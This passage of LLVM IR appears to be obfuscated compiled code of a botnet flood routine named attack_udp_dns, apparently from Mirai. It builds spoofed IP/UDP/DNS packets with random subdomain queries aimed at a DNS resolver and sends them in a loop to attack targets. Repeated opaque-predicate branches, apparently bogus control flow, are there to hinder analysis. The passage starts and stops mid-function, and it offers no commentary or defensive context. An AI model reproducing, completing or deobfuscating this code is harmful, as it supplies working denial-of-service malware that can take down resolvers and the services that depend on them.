  %186 = add i64 41, %185
  %187 = add i64 %186, 2
  %188 = load i32, i32* %29, align 4
  %189 = sext i32 %188 to i64
  %190 = add i64 %187, %189
  %191 = add i64 %190, 4
  %192 = trunc i64 %191 to i16
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 2
  store i16 %193, i16* %195, align 2
  %196 = load i16, i16* %21, align 2
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 3
  store i16 %197, i16* %199, align 4
  %200 = load i8, i8* %22, align 1
  %201 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 5
  store i8 %200, i8* %202, align 4
  %203 = load i8, i8* %23, align 1
  %204 = icmp ne i8 %203, 0
  br i1 %204, label %205, label %225

; <label>:205:                                    ; preds = %150
  %206 = load i32, i32* @x.37
  %207 = load i32, i32* @y.38
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %205
  %214 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %215 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 4
  store i16 %214, i16* %216, align 2
  %217 = load i32, i32* @x.37
  %218 = load i32, i32* @y.38
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %225

; <label>:225:                                    ; preds = %originalBBpart212, %150
  %226 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 6
  store i8 17, i8* %227, align 1
  %228 = load i32, i32* @LOCAL_ADDR, align 4
  %229 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 8
  store i32 %228, i32* %230, align 4
  %231 = load i32, i32* %30, align 4
  %232 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 9
  store i32 %231, i32* %233, align 4
  %234 = load i16, i16* %24, align 2
  %235 = call zeroext i16 @htons(i16 zeroext %234) #7
  %236 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %237 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %236, i32 0, i32 0
  store i16 %235, i16* %237, align 2
  %238 = load i16, i16* %25, align 2
  %239 = call zeroext i16 @htons(i16 zeroext %238) #7
  %240 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %241 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %240, i32 0, i32 1
  store i16 %239, i16* %241, align 2
  %242 = load i8, i8* %27, align 1
  %243 = zext i8 %242 to i64
  %244 = add i64 21, %243
  %245 = add i64 %244, 2
  %246 = load i32, i32* %29, align 4
  %247 = sext i32 %246 to i64
  %248 = add i64 %245, %247
  %249 = add i64 %248, 4
  %250 = trunc i64 %249 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #7
  %252 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %253 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %252, i32 0, i32 2
  store i16 %251, i16* %253, align 2
  %254 = load i16, i16* %26, align 2
  %255 = call zeroext i16 @htons(i16 zeroext %254) #7
  %256 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %257 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %256, i32 0, i32 0
  store i16 %255, i16* %257, align 2
  %258 = call zeroext i16 @htons(i16 zeroext 256) #7
  %259 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %260 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %259, i32 0, i32 1
  store i16 %258, i16* %260, align 2
  %261 = call zeroext i16 @htons(i16 zeroext 1) #7
  %262 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %263 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %262, i32 0, i32 2
  store i16 %261, i16* %263, align 2
  %264 = load i8, i8* %27, align 1
  %265 = load i8*, i8** %37, align 8
  %266 = getelementptr inbounds i8, i8* %265, i32 1
  store i8* %266, i8** %37, align 8
  store i8 %264, i8* %265, align 1
  %267 = load i8, i8* %27, align 1
  %268 = zext i8 %267 to i32
  %269 = load i8*, i8** %37, align 8
  %270 = sext i32 %268 to i64
  %271 = getelementptr inbounds i8, i8* %269, i64 %270
  store i8* %271, i8** %37, align 8
  %272 = load i8*, i8** %37, align 8
  store i8* %272, i8** %38, align 8
  %273 = load i8*, i8** %37, align 8
  %274 = getelementptr inbounds i8, i8* %273, i64 1
  %275 = load i8*, i8** %28, align 8
  %276 = load i32, i32* %29, align 4
  %277 = add nsw i32 %276, 1
  call void @util_memcpy(i8* %274, i8* %275, i32 %277)
  store i32 0, i32* %31, align 4
  br label %278

; <label>:278:                                    ; preds = %320, %225
  %279 = load i32, i32* %31, align 4
  %280 = load i32, i32* %29, align 4
  %281 = icmp slt i32 %279, %280
  br i1 %281, label %282, label %323

; <label>:282:                                    ; preds = %278
  %283 = load i32, i32* @x.37
  %284 = load i32, i32* @y.38
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %282
  %291 = load i8*, i8** %28, align 8
  %292 = load i32, i32* %31, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds i8, i8* %291, i64 %293
  %295 = load i8, i8* %294, align 1
  %296 = sext i8 %295 to i32
  %297 = icmp eq i32 %296, 46
  %298 = load i32, i32* @x.37
  %299 = load i32, i32* @y.38
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %297, label %306, label %316

; <label>:306:                                    ; preds = %originalBBpart216
  %307 = load i8, i8* %32, align 1
  %308 = load i8*, i8** %38, align 8
  store i8 %307, i8* %308, align 1
  store i8 0, i8* %32, align 1
  %309 = load i8, i8* %33, align 1
  %310 = add i8 %309, 1
  store i8 %310, i8* %33, align 1
  %311 = load i8*, i8** %37, align 8
  %312 = load i32, i32* %31, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds i8, i8* %311, i64 %313
  %315 = getelementptr inbounds i8, i8* %314, i64 1
  store i8* %315, i8** %38, align 8
  br label %319

; <label>:316:                                    ; preds = %originalBBpart216
  %317 = load i8, i8* %32, align 1
  %318 = add i8 %317, 1
  store i8 %318, i8* %32, align 1
  br label %319

; <label>:319:                                    ; preds = %316, %306
  br label %320

; <label>:320:                                    ; preds = %319
  %321 = load i32, i32* %31, align 4
  %322 = add nsw i32 %321, 1
  store i32 %322, i32* %31, align 4
  br label %278

; <label>:323:                                    ; preds = %278
  %324 = load i32, i32* @x.37
  %325 = load i32, i32* @y.38
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %323
  %332 = load i8, i8* %32, align 1
  %333 = load i8*, i8** %38, align 8
  store i8 %332, i8* %333, align 1
  %334 = load i8*, i8** %37, align 8
  %335 = load i32, i32* %29, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds i8, i8* %334, i64 %336
  %338 = getelementptr inbounds i8, i8* %337, i64 2
  %339 = bitcast i8* %338 to %struct.grehdr*
  store %struct.grehdr* %339, %struct.grehdr** %39, align 8
  %340 = call zeroext i16 @htons(i16 zeroext 1) #7
  %341 = load %struct.grehdr*, %struct.grehdr** %39, align 8
  %342 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %341, i32 0, i32 0
  store i16 %340, i16* %342, align 2
  %343 = call zeroext i16 @htons(i16 zeroext 1) #7
  %344 = load %struct.grehdr*, %struct.grehdr** %39, align 8
  %345 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %344, i32 0, i32 1
  store i16 %343, i16* %345, align 2
  %346 = load i32, i32* @x.37
  %347 = load i32, i32* @y.38
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %354

; <label>:354:                                    ; preds = %originalBBpart220
  %355 = load i32, i32* %17, align 4
  %356 = add nsw i32 %355, 1
  store i32 %356, i32* %17, align 4
  br label %129

; <label>:357:                                    ; preds = %originalBBpart28
  br label %358

; <label>:358:                                    ; preds = %574, %357
  %359 = load i32, i32* @x.37
  %360 = load i32, i32* @y.38
  %361 = sub i32 %359, 1
  %362 = mul i32 %359, %361
  %363 = urem i32 %362, 2
  %364 = icmp eq i32 %363, 0
  %365 = icmp slt i32 %360, 10
  %366 = or i1 %364, %365
  br i1 %366, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %358
  store i32 0, i32* %17, align 4
  %367 = load i32, i32* @x.37
  %368 = load i32, i32* @y.38
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %375

; <label>:375:                                    ; preds = %571, %originalBBpart224
  %376 = load i32, i32* @x.37
  %377 = load i32, i32* @y.38
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %375
  %384 = load i32, i32* %17, align 4
  %385 = load i8, i8* %13, align 1
  %386 = zext i8 %385 to i32
  %387 = icmp slt i32 %384, %386
  %388 = load i32, i32* @x.37
  %389 = load i32, i32* @y.38
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %387, label %396, label %574

; <label>:396:                                    ; preds = %originalBBpart228
  %397 = load i32, i32* @x.37
  %398 = load i32, i32* @y.38
  %399 = sub i32 %397, 1
  %400 = mul i32 %397, %399
  %401 = urem i32 %400, 2
  %402 = icmp eq i32 %401, 0
  %403 = icmp slt i32 %398, 10
  %404 = or i1 %402, %403
  br i1 %404, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %396
  %405 = bitcast [256 x i8*]* %40 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %405, i8* bitcast ([256 x i8*]* @attack_udp_dns.dns_array to i8*), i64 2048, i32 16, i1 false)
  %406 = call i32 @rand() #6
  %407 = srem i32 %406, 256
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds [256 x i8*], [256 x i8*]* %40, i64 0, i64 %408
  %410 = load i8*, i8** %409, align 8
  store i8* %410, i8** %41, align 8
  %411 = load i8*, i8** %41, align 8
  %412 = bitcast i8* %411 to %struct.iphdr*
  store %struct.iphdr* %412, %struct.iphdr** %42, align 8
  %413 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %414 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %413, i64 1
  %415 = bitcast %struct.iphdr* %414 to %struct.udphdr*
  store %struct.udphdr* %415, %struct.udphdr** %43, align 8
  %416 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %417 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %416, i64 1
  %418 = bitcast %struct.udphdr* %417 to %struct.dnshdr*
  store %struct.dnshdr* %418, %struct.dnshdr** %44, align 8
  %419 = load %struct.dnshdr*, %struct.dnshdr** %44, align 8
  %420 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %419, i64 1
  %421 = bitcast %struct.dnshdr* %420 to i8*
  %422 = getelementptr inbounds i8, i8* %421, i64 1
  store i8* %422, i8** %45, align 8
  %423 = load i16, i16* %21, align 2
  %424 = zext i16 %423 to i32
  %425 = icmp eq i32 %424, 65535
  %426 = load i32, i32* @x.37
  %427 = load i32, i32* @y.38
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %425, label %434, label %440

; <label>:434:                                    ; preds = %originalBBpart232
  %435 = call i32 @rand_next()
  %436 = and i32 %435, 65535
  %437 = trunc i32 %436 to i16
  %438 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %439 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %438, i32 0, i32 3
  store i16 %437, i16* %439, align 4
  br label %440

; <label>:440:                                    ; preds = %434, %originalBBpart232
  %441 = load i16, i16* %24, align 2
  %442 = zext i16 %441 to i32
  %443 = icmp eq i32 %442, 65535
  br i1 %443, label %444, label %450

; <label>:444:                                    ; preds = %440
  %445 = call i32 @rand_next()
  %446 = and i32 %445, 65535
  %447 = trunc i32 %446 to i16
  %448 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %449 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %448, i32 0, i32 0
  store i16 %447, i16* %449, align 2
  br label %450

; <label>:450:                                    ; preds = %444, %440
  %451 = load i32, i32* @x.37
  %452 = load i32, i32* @y.38
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %450
  %459 = load i16, i16* %25, align 2
  %460 = zext i16 %459 to i32
  %461 = icmp eq i32 %460, 65535
  %462 = load i32, i32* @x.37
  %463 = load i32, i32* @y.38
  %464 = sub i32 %462, 1
  %465 = mul i32 %462, %464
  %466 = urem i32 %465, 2
  %467 = icmp eq i32 %466, 0
  %468 = icmp slt i32 %463, 10
  %469 = or i1 %467, %468
  br i1 %469, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %461, label %470, label %492

; <label>:470:                                    ; preds = %originalBBpart236
  %471 = load i32, i32* @x.37
  %472 = load i32, i32* @y.38
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %470
  %479 = call i32 @rand_next()
  %480 = and i32 %479, 65535
  %481 = trunc i32 %480 to i16
  %482 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %483 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %482, i32 0, i32 1
  store i16 %481, i16* %483, align 2
  %484 = load i32, i32* @x.37
  %485 = load i32, i32* @y.38
  %486 = sub i32 %484, 1
  %487 = mul i32 %484, %486
  %488 = urem i32 %487, 2
  %489 = icmp eq i32 %488, 0
  %490 = icmp slt i32 %485, 10
  %491 = or i1 %489, %490
  br i1 %491, label %originalBBpart243, label %originalBB38alteredBB

originalBBpart243:                                ; preds = %originalBB38
  br label %492

; <label>:492:                                    ; preds = %originalBBpart243, %originalBBpart236
  %493 = load i16, i16* %26, align 2
  %494 = zext i16 %493 to i32
  %495 = icmp eq i32 %494, 65535
  br i1 %495, label %496, label %502

; <label>:496:                                    ; preds = %492
  %497 = call i32 @rand_next()
  %498 = and i32 %497, 65535
  %499 = trunc i32 %498 to i16
  %500 = load %struct.dnshdr*, %struct.dnshdr** %44, align 8
  %501 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %500, i32 0, i32 0
  store i16 %499, i16* %501, align 2
  br label %502

; <label>:502:                                    ; preds = %496, %492
  %503 = load i8*, i8** %45, align 8
  %504 = load i8, i8* %27, align 1
  %505 = zext i8 %504 to i32
  %506 = call i32 (i8*, i32, ...) bitcast (i32 (...)* @rand_alphastr to i32 (i8*, i32, ...)*)(i8* %503, i32 %505)
  %507 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %508 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %507, i32 0, i32 7
  store i16 0, i16* %508, align 2
  %509 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %510 = bitcast %struct.iphdr* %509 to i16*
  %511 = call zeroext i16 @checksum_generic(i16* %510, i32 20)
  %512 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %513 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %512, i32 0, i32 7
  store i16 %511, i16* %513, align 2
  %514 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %515 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %514, i32 0, i32 3
  store i16 0, i16* %515, align 2
  %516 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %517 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %518 = bitcast %struct.udphdr* %517 to i8*
  %519 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %520 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %519, i32 0, i32 2
  %521 = load i16, i16* %520, align 2
  %522 = load i8, i8* %27, align 1
  %523 = zext i8 %522 to i64
  %524 = add i64 21, %523
  %525 = add i64 %524, 2
  %526 = load i32, i32* %29, align 4
  %527 = sext i32 %526 to i64
  %528 = add i64 %525, %527
  %529 = add i64 %528, 4
  %530 = trunc i64 %529 to i32
  %531 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %516, i8* %518, i16 zeroext %521, i32 %530)
  %532 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %533 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %532, i32 0, i32 3
  store i16 %531, i16* %533, align 2
  %534 = load i32, i32* %30, align 4
  %535 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %536 = load i32, i32* %17, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %535, i64 %537
  %539 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %538, i32 0, i32 0
  %540 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %539, i32 0, i32 2
  %541 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %540, i32 0, i32 0
  store i32 %534, i32* %541, align 4
  %542 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %543 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %542, i32 0, i32 1
  %544 = load i16, i16* %543, align 2
  %545 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %546 = load i32, i32* %17, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %545, i64 %547
  %549 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %548, i32 0, i32 0
  %550 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %549, i32 0, i32 1
  store i16 %544, i16* %550, align 2
  %551 = load i32, i32* %18, align 4
  %552 = load i8*, i8** %41, align 8
  %553 = load i8, i8* %27, align 1
  %554 = zext i8 %553 to i64
  %555 = add i64 41, %554
  %556 = add i64 %555, 2
  %557 = load i32, i32* %29, align 4
  %558 = sext i32 %557 to i64
  %559 = add i64 %556, %558
  %560 = add i64 %559, 4
  %561 = bitcast %union.__CONST_SOCKADDR_ARG* %46 to %struct.sockaddr**
  %562 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %563 = load i32, i32* %17, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %562, i64 %564
  %566 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %565, i32 0, i32 0
  %567 = bitcast %struct.sockaddr_in* %566 to %struct.sockaddr*
  store %struct.sockaddr* %567, %struct.sockaddr** %561, align 8
  %568 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %46, i32 0, i32 0
  %569 = load %struct.sockaddr*, %struct.sockaddr** %568, align 8
  %570 = call i64 @sendto(i32 %551, i8* %552, i64 %560, i32 16384, %struct.sockaddr* %569, i32 16)
  br label %571

; <label>:571:                                    ; preds = %502
  %572 = load i32, i32* %17, align 4
  %573 = add nsw i32 %572, 1
  store i32 %573, i32* %17, align 4
  br label %375

; <label>:574:                                    ; preds = %originalBBpart228
  br label %358

; <label>:575:                                    ; preds = %125, %119, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %576 = alloca i8, align 1
  %577 = alloca %struct.attack_target*, align 8
  %578 = alloca i8, align 1
  %579 = alloca %struct.attack_option*, align 8
  %580 = alloca i32, align 4
  %581 = alloca i32, align 4
  %582 = alloca i8**, align 8
  %583 = alloca i8, align 1
  %584 = alloca i16, align 2
  %585 = alloca i8, align 1
  %586 = alloca i8, align 1
  %587 = alloca i16, align 2
  %588 = alloca i16, align 2
  %589 = alloca i16, align 2
  %590 = alloca i8, align 1
  %591 = alloca i8*, align 8
  %592 = alloca i32, align 4
  %593 = alloca i32, align 4
  %594 = alloca i32, align 4
  %595 = alloca i8, align 1
  %596 = alloca i8, align 1
  %597 = alloca %struct.iphdr*, align 8
  %598 = alloca %struct.udphdr*, align 8
  %599 = alloca %struct.dnshdr*, align 8
  %600 = alloca i8*, align 8
  %601 = alloca i8*, align 8
  %602 = alloca %struct.grehdr*, align 8
  %603 = alloca [256 x i8*], align 16
  %604 = alloca i8*, align 8
  %605 = alloca %struct.iphdr*, align 8
  %606 = alloca %struct.udphdr*, align 8
  %607 = alloca %struct.dnshdr*, align 8
  %608 = alloca i8*, align 8
  %609 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %576, align 1
  store %struct.attack_target* %1, %struct.attack_target** %577, align 8
  store i8 %2, i8* %578, align 1
  store %struct.attack_option* %3, %struct.attack_option** %579, align 8
  %610 = load i8, i8* %576, align 1
  %611 = zext i8 %610 to i64
  %612 = call noalias i8* @calloc(i64 %611, i64 8) #6
  %613 = bitcast i8* %612 to i8**
  store i8** %613, i8*** %582, align 8
  %614 = load i8, i8* %578, align 1
  %615 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %616 = call i32 @attack_get_opt_int(i8 zeroext %614, %struct.attack_option* %615, i8 zeroext 2, i32 0)
  %617 = trunc i32 %616 to i8
  store i8 %617, i8* %583, align 1
  %618 = load i8, i8* %578, align 1
  %619 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %620 = call i32 @attack_get_opt_int(i8 zeroext %618, %struct.attack_option* %619, i8 zeroext 3, i32 65535)
  %621 = trunc i32 %620 to i16
  store i16 %621, i16* %584, align 2
  %622 = load i8, i8* %578, align 1
  %623 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %624 = call i32 @attack_get_opt_int(i8 zeroext %622, %struct.attack_option* %623, i8 zeroext 4, i32 64)
  %625 = trunc i32 %624 to i8
  store i8 %625, i8* %585, align 1
  %626 = load i8, i8* %578, align 1
  %627 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %628 = call i32 @attack_get_opt_int(i8 zeroext %626, %struct.attack_option* %627, i8 zeroext 5, i32 0)
  %629 = trunc i32 %628 to i8
  store i8 %629, i8* %586, align 1
  %630 = load i8, i8* %578, align 1
  %631 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %632 = call i32 @attack_get_opt_int(i8 zeroext %630, %struct.attack_option* %631, i8 zeroext 6, i32 65535)
  %633 = trunc i32 %632 to i16
  store i16 %633, i16* %587, align 2
  %634 = load i8, i8* %578, align 1
  %635 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %636 = call i32 @attack_get_opt_int(i8 zeroext %634, %struct.attack_option* %635, i8 zeroext 7, i32 53)
  %637 = trunc i32 %636 to i16
  store i16 %637, i16* %588, align 2
  %638 = load i8, i8* %578, align 1
  %639 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %640 = call i32 @attack_get_opt_int(i8 zeroext %638, %struct.attack_option* %639, i8 zeroext 9, i32 65535)
  %641 = trunc i32 %640 to i16
  store i16 %641, i16* %589, align 2
  %642 = load i8, i8* %578, align 1
  %643 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %644 = call i32 @attack_get_opt_int(i8 zeroext %642, %struct.attack_option* %643, i8 zeroext 0, i32 1458)
  %645 = trunc i32 %644 to i8
  store i8 %645, i8* %590, align 1
  %646 = load i8, i8* %578, align 1
  %647 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %648 = call i8* @attack_get_opt_str(i8 zeroext %646, %struct.attack_option* %647, i8 zeroext 8, i8* null)
  store i8* %648, i8** %591, align 8
  %649 = call i32 @get_dns_resolver()
  store i32 %649, i32* %593, align 4
  %650 = load i8*, i8** %591, align 8
  %651 = icmp eq i8* %650, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %97
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %129
  %652 = load i32, i32* %17, align 4
  %653 = load i8, i8* %13, align 1
  %654 = zext i8 %653 to i32
  %655 = icmp slt i32 %652, %654
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %205
  %656 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %657 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %658 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %657, i32 0, i32 4
  store i16 %656, i16* %658, align 2
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %282
  %659 = load i8*, i8** %28, align 8
  %660 = load i32, i32* %31, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds i8, i8* %659, i64 %661
  %663 = load i8, i8* %662, align 1
  %664 = sext i8 %663 to i32
  %665 = icmp eq i32 %664, 46
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %323
  %666 = load i8, i8* %32, align 1
  %667 = load i8*, i8** %38, align 8
  store i8 %666, i8* %667, align 1
  %668 = load i8*, i8** %37, align 8
  %669 = load i32, i32* %29, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds i8, i8* %668, i64 %670
  %672 = getelementptr inbounds i8, i8* %671, i64 2
  %673 = bitcast i8* %672 to %struct.grehdr*
  store %struct.grehdr* %673, %struct.grehdr** %39, align 8
  %674 = call zeroext i16 @htons(i16 zeroext 1) #7
  %675 = load %struct.grehdr*, %struct.grehdr** %39, align 8
  %676 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %675, i32 0, i32 0
  store i16 %674, i16* %676, align 2
  %677 = call zeroext i16 @htons(i16 zeroext 1) #7
  %678 = load %struct.grehdr*, %struct.grehdr** %39, align 8
  %679 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %678, i32 0, i32 1
  store i16 %677, i16* %679, align 2
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %358
  store i32 0, i32* %17, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %375
  %680 = load i32, i32* %17, align 4
  %681 = load i8, i8* %13, align 1
  %682 = zext i8 %681 to i32
  %683 = icmp slt i32 %680, %682
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %396
  %684 = bitcast [256 x i8*]* %40 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %684, i8* bitcast ([256 x i8*]* @attack_udp_dns.dns_array to i8*), i64 2048, i32 16, i1 false)
  %685 = call i32 @rand() #6
  %_ = sub i32 %685, 256
  %gen = mul i32 %_, 256
  %686 = srem i32 %685, 256
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds [256 x i8*], [256 x i8*]* %40, i64 0, i64 %687
  %689 = load i8*, i8** %688, align 8
  store i8* %689, i8** %41, align 8
  %690 = load i8*, i8** %41, align 8
  %691 = bitcast i8* %690 to %struct.iphdr*
  store %struct.iphdr* %691, %struct.iphdr** %42, align 8
  %692 = load %struct.iphdr*, %struct.iphdr** %42, align 8
